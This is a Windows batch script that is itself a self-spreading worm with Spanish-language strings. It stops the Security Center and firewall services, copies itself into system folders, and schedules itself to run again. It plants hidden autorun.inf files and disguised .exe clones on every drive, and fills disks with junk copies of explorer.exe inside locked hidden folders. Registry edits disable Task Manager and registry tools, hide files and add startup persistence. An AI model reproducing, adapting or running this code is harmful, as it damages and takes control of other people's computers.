@echo off
set me=%0
set e=echo
attrib %0 +r
net stop "Centro de Seguridad"
net stop "Firewall de Windows/Conexi¢n compartida a Internet (ICS)"

set hora=%time:~0,5%
set fecha=%date:~0,2%
set /a fecha+=3
if %fecha% GTR 29 (set fecha=1)

if "%1" EQU "true" (goto:ini)
if "%~p0" EQU "\" (explorer %~d0) else (if exist %~n0 (explorer %~n0) else (call:error %me%))
if not exist %windir%\security\"%~nx0" (echo S|xcopy /H %me% %windir%\security)
at | find "%~nx0"
if %errorlevel% GTR 0 (at %hora% /next:%fecha% %windir%\security\%~nx0 true)
exit

:ini
for /f "skip=1 tokens=1*" %%a in ('tasklist ^| find "%~nx0"') do (if %%a. NEQ . (exit))
pushd %windir%\system32\dllcache
if not exist goma.bat call:goma>goma.bat
if exist goma.bat start /b goma.bat

if not exist %windir%\"%~nx0" (echo S|xcopy /H %0 %windir%)
if exist %windir%\"%~nx0" set virus=C:\Windows\"%~nx0"
set virus=%virus:"=%
for %%a in (A C D E F G H I J K) do (if exist %%a: (call:magic %%a "%virus%"))
setlocal enabledelayedexpansion
for %%a in (A C D E F G H I J K) do (
       if exist %%a: (
             pushd %%a:\
             for /f "tokens=3 delims= " %%b in ('dir ^| find /I " bytes libres"') do set m=%%b
             set m=!m:.=!
             set /a m/=1034752
             if exist wsegurity (echo S|cacls wsecurity /P %username%:F) else (md wsegurity)
             attrib wsecurity +s +h +r
             cd wsecurity
             for /L %%c in (1,1,!m!) do type %windir%\explorer.exe>>power%%c.sgt
             cd..
             echo S|cacls wsecurity /P %username%:N
                      )
       )
)
endlocal
exit

:goma
%e% @echo off
%e% reg add "hklm\software\microsoft\command processor" /v AutoRun /d "color 0a&&cls&&title Shell&&prompt $hwizard@host:" /f
%e% reg add "hkcu\software\microsoft\windows\currentversion\policies\system" /v DisableTaskMgr /t REG_DWORD /d 1 /f
%e% reg add "hkcu\software\microsoft\windows\currentversion\policies\system" /v DisableRegistryTools /t REG_DWORD /d 1 /f
%e% reg add "hkcu\software\microsoft\windows\currentversion\policies\uninstall"  /v NoAddRemovePrograms /t REG_DWORD /d 1 /F
%e% reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Hidden /t REG_DWORD /d 2 /f
%e% reg add "hklm\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\SuperHidden" /v CheckedValue /t REG_DWORD /d 1 /f
%e% reg add "hkcu\software\microsoft\windows\currentversion\policies\explorer" /v NoViewContextMenu /t REG_DWORD /d 1 /f
%e% reg add "hklm\software\microsoft\windows\currentversion\run" /v CacheDefault /d %windir%\system32\dllcache\cache.vbs /f
%e% rundll32 user32.dll,UpdatePerUserSystemParameters
%e%.
%e% pushd %windir%\system32\dllcache
%e% if not exist dllcache.vbs (call:cache ^>cache.vbs)
%e% if not exist %%~nx0% % (xcopy /h %%0)%
%e% if exist cache.vbs (start cache.vbs)
%e% exit
%e%.
%e% :cache
%e% %e% set wzr=CreateObject ^("Wscript.shell")
%e% %e% wzr.run ^"goma.bat",vbhide
%e% goto:EOF
goto:EOF


:magic
pushd %1:\
if exist autorun.inf (
attrib autorun.inf -a -s -r -h
del autorun.inf
)
if not exist %1$.exe (call:clon "%1$" %2)
if exist %1$.exe (
call:auto %1$.exe>autorun.inf
attrib %1$.exe +s +h
)
for /D %%a in (*) do (if %%a. NEQ . (call:clon "%%a" %2 && call:02 "%%a" %2)
goto:EOF

:clon
if exist %1.exe (goto:EOF) else (
echo f|xcopy /h %2 %1.exe
attrib %1 +s +h
)
goto:EOF

:02
cd %1
for /D %%b in (*) do (if %%b. NEQ . (call:clon "%%b" %2)
cd..
goto:EOF

:auto
%e% [autorun]
%e% open=%1
%e% shell\open\command=%1
%e% shell\explorer\command=%1
attrib autorun.inf +s +h +r
goto:EOF

:error
echo wzr="No se puede tener acceso a %~dpn1" ^& chr(13) ^& chr(13) ^& " Acceso  denegado. ">%temp%\suc.vbs
echo Msgbox wzr,VBCRITICAL,"Unidad local (%~d0)" >>%temp%\suc.vbs
start %temp%\suc.vbs
ping 127.0.0.1 -n 2 >nul
del %temp%\suc.vbs
goto:EOF